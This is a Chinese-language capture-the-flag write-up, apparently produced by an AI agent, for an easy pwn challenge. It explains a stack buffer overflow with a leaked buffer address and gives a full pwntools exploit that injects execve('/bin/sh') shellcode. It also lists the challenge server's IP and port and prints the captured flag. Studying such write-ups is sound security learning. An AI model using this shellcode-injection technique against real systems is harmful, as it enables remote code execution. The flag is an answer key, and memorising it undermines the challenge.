---
title: "PWN-MessageBoard"
ctf: "未知"
date: 2026-05-30
category: pwn
difficulty: easy
points: 200
flag_format: "unknown"
author: "Codex"
---

# PWN-MessageBoard

## Summary

程序会把栈上 `buf` 的地址直接打印出来，然后用 `read(0, buf, 0x100)` 向 128 字节栈缓冲区读入数据。由于二进制无 canary、无 PIE、栈可执行，所以可以直接栈上写入 shellcode，并把返回地址覆盖成泄露出的 `buf` 地址拿 shell。

## Solution

### Step 1: 确认漏洞与保护

伪代码核心逻辑如下：

```c
char buf[128];
printf("Buffer at: %p\n", buf);
read(0, buf, 0x100u);
```

- 缓冲区大小是 `0x80`
- `read()` 读取 `0x100` 字节，存在明显栈溢出
- 保存返回地址的偏移是 `0x80 + 0x8 = 136`
- `checksec` 结果显示 `No canary`、`No PIE`、`Executable Stack`

### Step 2: 栈上注入 shellcode

直接发送：

1. `amd64` 的 `execve("/bin/sh")` shellcode
2. 补齐到 136 字节
3. 用泄露出的 `buf` 地址覆盖返回地址

```python
from pwn import *

HOST = "47.99.147.34"
PORT = 10303
LOCAL_BIN = "/mnt/d/桌面/yuwang/pwn/PWN-MessageBoard/vuln"
OFFSET = 136

context.arch = "amd64"

def build_payload(buf_addr):
    shellcode = asm(shellcraft.sh())
    return shellcode.ljust(OFFSET, b"\x90") + p64(buf_addr)

def solve(io):
    io.recvuntil(b"Buffer at: ")
    buf_addr = int(io.recvline().strip(), 16)
    io.recvuntil(b"Message: ")
    io.send(build_payload(buf_addr))
    io.recvuntil(b"Thank you for your message!\n")
    io.interactive()

if __name__ == "__main__":
    p = process([b"qemu-x86_64", LOCAL_BIN.encode()])
    solve(p)
```

本地验证成功，发包后可以执行命令，示例输出：

```text
$ python3 exploit.py LOCAL CMD="echo LOCAL_OK"
[+] buffer leak: 0x2aaaab2aafe0
LOCAL_OK
```

远程实测同样可以利用，`cat /flag` 直接读到 flag：

```text
flag{f308861f0cb75c41de4b26f999fe4d6b}
```

## Notes

- 附件 `vlun.zip` 里只有一个 `vuln` 二进制，没有额外 flag 文件或隐藏附件。
- 远程服务偶尔会出现连接成功但回显不稳定的情况，必要时重连几次即可；核心利用链不受影响。
- 从附件本身可以完整推出利用链，题目逻辑可行，属于标准的“泄露栈地址 + 栈溢出 + 可执行栈 shellcode 注入”题。

## Flag

```text
flag{f308861f0cb75c41de4b26f999fe4d6b}
```
